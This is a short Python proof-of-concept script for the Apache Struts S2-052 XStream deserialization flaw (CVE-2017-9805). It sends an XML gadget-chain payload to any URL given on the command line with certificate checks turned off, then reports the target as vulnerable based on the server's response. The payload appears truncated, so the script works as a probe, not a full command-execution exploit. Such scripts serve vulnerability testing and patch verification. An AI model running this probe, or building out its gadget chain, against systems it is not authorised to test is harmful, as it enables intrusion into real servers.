#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# author:ray, python3 rewrite with SSL error bypass: np@seq.lv
# date:2019-4-10, rewrite @ 2023-11-07

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

header = {
    'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0',
    'Content-Type':'application/xml',
    'Connection':'close',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }

payload = '''<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><valueclass="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSourceclass="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSour>'''

def poc(url, data, headers):

    print(f"Sending POST request to {url} with payload:\n{data}")
    response = requests.post(url, data=data, headers=headers, verify=False)

    print(f"Received response with status code: {response.status_code}")
    print(f"Response headers:\n{response.headers}")
 
    if response.status_code == 500 or "java.security.Provider$Service" in response.text:
        print('【*】The Vulnerability exists S2-052···')
    else:
        print(f"【*】Target doesnt seem vulnerable, response text:\n{response.text}")
        return response.text

if __name__ == '__main__':

    try:
        url = sys.argv[1]
        print("----------------------------------------")
        print("|      CVE-2017-9805 | S2-052-POC      |")
        print("----------------------------------------")
        poc(url, data=payload, headers=header)
    except IndexError:
        print("Usage : python CVE-2017-9805-S2-052-POC.py http://127.0.0.1/orders/")
